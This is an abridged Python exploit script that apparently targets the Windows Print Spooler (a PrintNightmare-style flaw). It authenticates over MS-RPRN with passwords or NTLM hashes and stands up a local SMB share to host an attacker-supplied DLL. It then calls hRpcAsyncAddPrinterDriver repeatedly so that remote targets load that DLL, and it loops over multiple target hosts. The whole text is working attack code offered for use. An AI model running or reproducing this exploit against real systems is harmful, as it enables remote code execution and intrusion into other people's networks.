    ...
    def exploit(dce, pDriverPath, share, handle=NULL):
        ...
        for i in range(1, 30):
            try:
                ...
                resp = par.hRpcAsyncAddPrinterDriver(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
                print(f"[*] Stage{i}: {resp['ErrorCode']}")
                if resp['ErrorCode'] == 0:
...
class MSRPRN:
    @staticmethod
    def connect(username, password, domain, lmhash, nthash, address, port, timeout=5):
        binding = f'ncacn_np:{address}[\PIPE\spoolss]'
...
def exploit(username, password, lmhash, nthash, domain, filepath_to_dll, target_ip, port, proto="MS-RPRN", pDriverPath=None, timeout=5):
    if os.path.exists(filepath_to_dll):
        smb = SMBserver(gen_rand_string())
        smb.daemon = True
        smb.start()

        shutil.copy(filepath_to_dll, smb.share_path)
        if os.path.exists(os.path.join(smb.share_path, os.path.basename(filepath_to_dll))):
            dll = '\\\\{}\\{}\\{}'.format(get_local_ip(), gen_rand_string(), os.path.basename(filepath_to_dll))
            print(f'[+] Self-hosted payload at {dll}')
        else:
        ...
        exit(1)
    dce = proto.connect(username, password, domain, lmhash, nthash, target, port, timeout)
    if not dce:
        return
    handle = NULL
    ...
    if not pDriverPath:
        try:
            ...
            if "FileRepository" not in pDriverPath:
                print(f"[-] pDriverPath {pDriverPath}, expected :\\Windows\\System32\\DriverStore\\FileRepository\\.....")
                print("[-] Specify pDriverPath manually")
                # sys.exit(1)

        except Exception:
            print(f'[-] Failed enumerating remote pDriverPath: {Exception}')
            # sys.exit(1)
    else:
...
if __name__ == '__main__':
    ...
    if args.remote_dll:
        dll = args.remote_dll
        print(f'[*] Using remote payload at {dll}')
        ...
        if os.path.exists(os.path.join(smb.share_path, os.path.basename(args.dll))):
            dll = f'\\\\{args.local_ip}\\{args.share}\\{os.path.basename(args.dll)}'
            print(f'[+] Self-hosted payload at {dll}')
        else:
            print('[!] Unable to copy target DLL.')
            exit(1)
    ...
    for target in TargetParser().parse(args.target):
        try:
            print(f'\n[*] Attempting target: {target}')
            main(target, dll, args)
        except Exception as e:
            print(f'[-] Exploit returned: {e}')
